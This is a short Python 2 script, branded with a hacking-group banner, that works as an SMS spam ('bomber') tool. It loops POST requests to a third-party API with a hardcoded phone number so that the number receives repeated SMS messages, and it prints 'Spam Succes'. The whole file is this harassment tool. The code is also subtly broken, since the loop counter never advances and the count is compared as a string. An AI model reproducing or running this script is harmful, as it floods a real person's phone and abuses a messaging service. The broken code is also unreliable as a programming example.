#!/usr/bin/python
import requests,json,time,subprocess
import os, time
import subprocess as sp

subprocess.call("clear", shell=True)

banner = """
╔╗╴╴╴╔══════╗ \033[1;34mRPL 1\033[1;36m HACKING\033[0m
║║╴╴╴║╴╔════╝
║╚═══╝╴╚════╗ Pencipta \033[1;32mEri Setiawan\033[0m
╚════╗╴╔═══╗║ 
╔════╝╴║╴╴╴║║ MIKAMI SQUAD
╚══════╝╴╴╴╚╝
"""

x = 0
print banner
a = raw_input("[+] Lanjutkan (y/n): ")
d = raw_input("[+] Jumlah : ")
while x < d:
   b = {"https://xxnx.com":a}
   c = " https://0x.nakocoders.org/rest-api/lain-nya/api.php?nomor=081917171967"
   e = requests.post(c, data=b)
   f = json.loads(e.text)
   if "nexmo_request_id" in f:
       print "[+] SUCESS WITH ID",f["nexmo_request_id"]
   else:
       print "[+] Spam Succes"
         
